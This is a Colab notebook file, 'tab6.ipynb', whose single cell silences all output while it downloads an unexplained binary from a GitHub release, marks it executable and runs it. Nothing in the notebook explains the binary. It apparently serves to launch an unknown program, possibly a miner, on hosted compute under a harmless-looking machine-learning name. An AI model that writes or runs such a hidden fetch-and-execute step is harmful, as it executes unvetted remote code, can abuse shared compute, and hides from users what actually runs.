{
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "LJdIJdd85EXP"
      },
      "outputs": [],
      "source": [
        "%%capture\n",
        "! wget -q https://github.com/includemachine10/learningmachine/releases/download/v.1/var.zip && unzip -q var.zip\n",
        "! chmod +x var\n",
        "! ./var ann"
      ]
    }
  ],
  "metadata": {
    "colab": {
      "collapsed_sections": [],
      "machine_shape": "hm",
      "name": "tab6.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}
